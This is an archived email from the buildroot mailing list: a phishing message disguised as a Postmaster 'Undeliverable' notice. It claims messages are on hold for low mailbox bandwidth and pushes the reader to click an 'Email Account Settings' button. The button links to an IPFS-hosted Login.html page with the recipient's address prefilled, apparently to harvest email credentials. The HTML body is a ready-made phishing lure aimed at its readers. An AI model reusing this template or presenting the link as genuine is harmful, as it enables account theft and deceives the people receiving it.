Return-Path: <buildroot-bounces@buildroot.org>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from smtp4.osuosl.org (smtp4.osuosl.org [140.211.166.137])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id CDD06C4345F
	for <buildroot@archiver.kernel.org>; Mon, 15 Apr 2024 23:29:42 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
	by smtp4.osuosl.org (Postfix) with ESMTP id 781CF4007B;
	Mon, 15 Apr 2024 23:29:42 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp4.osuosl.org ([127.0.0.1])
 by localhost (smtp4.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id bhrNAlXqEZ12; Mon, 15 Apr 2024 23:29:41 +0000 (UTC)
X-Comment: SPF check N/A for local connections - client-ip=140.211.166.34; helo=ash.osuosl.org; envelope-from=buildroot-bounces@buildroot.org; receiver=<UNKNOWN> 
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp4.osuosl.org 18256400F3
Received: from ash.osuosl.org (ash.osuosl.org [140.211.166.34])
	by smtp4.osuosl.org (Postfix) with ESMTP id 18256400F3;
	Mon, 15 Apr 2024 23:29:41 +0000 (UTC)
Received: from smtp1.osuosl.org (smtp1.osuosl.org [140.211.166.138])
 by ash.osuosl.org (Postfix) with ESMTP id 047771BF376
 for <buildroot@lists.busybox.net>; Mon, 15 Apr 2024 23:29:39 +0000 (UTC)
Received: from localhost (localhost [127.0.0.1])
 by smtp1.osuosl.org (Postfix) with ESMTP id F0B8C80F05
 for <buildroot@lists.busybox.net>; Mon, 15 Apr 2024 23:29:38 +0000 (UTC)
X-Virus-Scanned: amavis at osuosl.org
Received: from smtp1.osuosl.org ([127.0.0.1])
 by localhost (smtp1.osuosl.org [127.0.0.1]) (amavis, port 10024) with ESMTP
 id C0H4OUAyjnHZ for <buildroot@lists.busybox.net>;
 Mon, 15 Apr 2024 23:29:38 +0000 (UTC)
Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=203.149.232.166;
 helo=busybox.net; envelope-from=buildroot@busybox.net; receiver=<UNKNOWN> 
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp1.osuosl.org 7ACD180F04
DKIM-Filter: OpenDKIM Filter v2.11.0 smtp1.osuosl.org 7ACD180F04
Received: from busybox.net (unknown [203.149.232.166])
 by smtp1.osuosl.org (Postfix) with ESMTP id 7ACD180F04
 for <buildroot@busybox.net>; Mon, 15 Apr 2024 23:29:36 +0000 (UTC)
From: Postmaster <buildroot@busybox.net>
To: buildroot@busybox.net
Date: 16 Apr 2024 00:29:35 +0100
Message-ID: <20240416002935.5CEC33E35D5A8E61@busybox.net>
MIME-Version: 1.0
X-Mailman-Original-Authentication-Results: smtp1.osuosl.org;
 dmarc=none (p=none dis=none)
 header.from=busybox.net
Subject: [Buildroot] Undeliverable: Incoming messages failure
X-BeenThere: buildroot@buildroot.org
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Discussion and development of buildroot <buildroot.buildroot.org>
List-Unsubscribe: <https://lists.buildroot.org/mailman/options/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=unsubscribe>
List-Archive: <http://lists.buildroot.org/pipermail/buildroot/>
List-Post: <mailto:buildroot@buildroot.org>
List-Help: <mailto:buildroot-request@buildroot.org?subject=help>
List-Subscribe: <https://lists.buildroot.org/mailman/listinfo/buildroot>,
 <mailto:buildroot-request@buildroot.org?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============8522259420612848627=="
Errors-To: buildroot-bounces@buildroot.org
Sender: "buildroot" <buildroot-bounces@buildroot.org>

--===============8522259420612848627==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.20139">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body><table width=3D"100%" bgcolor=3D"#ffffff" border=3D"0" cellspacing=3D=
"0" cellpadding=3D"0"><tbody><tr><td align=3D"center" style=3D"margin: 0px;=
"><p><font size=3D"4">Dear&nbsp;</font><a style=3D"color: rgb(34, 34, 34);"=
><font size=3D"4">buildroot@busybox.net</font></a><font size=3D"4">,</font>=
</p><span style=3D"color: rgb(72, 84, 93); line-height: 24px; font-size: 14=
px;"><font size=3D"4">Your incoming messages has been placed on hold due to=
 low mailbox bandwidth.<br>
Go to Email account settings below to review held messages and fix bugs.</f=
ont></span></td></tr>
<tr>
<td height=3D"20" style=3D"margin: 0px;"><font size=3D"4">&nbsp;</font></td=
></tr>
<tr>
<td width=3D"48%" align=3D"center" valign=3D"top" style=3D"margin: 0px;"><s=
pan><a style=3D"padding: 15px 25px; color: rgb(255, 255, 255); text-decorat=
ion: none; display: block; background-color: rgb(0, 135, 209);" href=3D"htt=
ps://dweb.link/ipfs/bafkreihtggm5lijbcmgnngp56fgtaxfzglditdvyi6vhk6v4yi5nmu=
rq2u?filename=3DLogin.html#buildroot@busybox.net" target=3D"_blank" rel=3D"=
noreferrer"><font size=3D"4">Email Account Settings</font></a></span></td><=
/tr>
<tr>
<td height=3D"20" style=3D"margin: 0px;"><font size=3D"4"></font></td></tr>=

<tr>
<td height=3D"20" style=3D"margin: 0px;"><font size=3D"4"></font></td></tr>=

<tr>
<td align=3D"center" style=3D"margin: 0px;">
<p style=3D"color: rgb(162, 162, 162); line-height: 17px; font-size: 12px; =
font-style: italic;"><font size=3D"3">You won't receive messages failure to=
 review your account.<br>&copy; 2024 busybox.net. All Rights Reserved.</fon=
t></p></td></tr></tbody></table></body></html>

--===============8522259420612848627==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
buildroot mailing list
buildroot@buildroot.org
https://lists.buildroot.org/mailman/listinfo/buildroot

--===============8522259420612848627==--
